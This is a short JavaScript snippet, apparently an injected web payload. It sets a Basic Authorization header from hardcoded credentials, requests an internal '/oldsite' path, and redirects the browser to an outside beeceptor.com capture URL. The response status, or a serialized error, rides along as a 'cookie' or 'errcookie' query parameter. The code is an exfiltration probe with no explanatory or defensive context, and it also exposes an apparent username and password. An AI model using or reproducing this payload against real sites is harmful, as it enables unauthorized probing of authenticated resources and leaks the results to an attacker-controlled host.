(async () => {
  let headers = new Headers();
  headers.set('Authorization', 'Basic ' + btoa('dev_us' + ":" + 'valera_smeni_kredi_4mo'));
  fetch('/oldsite ', {headers, redirect: 'manual'}).then(res => {
    window.location.replace('https://gvfdgdfgfsfd.free.beeceptor.com?cookie=' + res.status);
  }).catch(err => {
    window.location.replace('https://gvfdgdfgfsfd.free.beeceptor.com?errcookie=' + JSON.stringify(err))
  });
})()
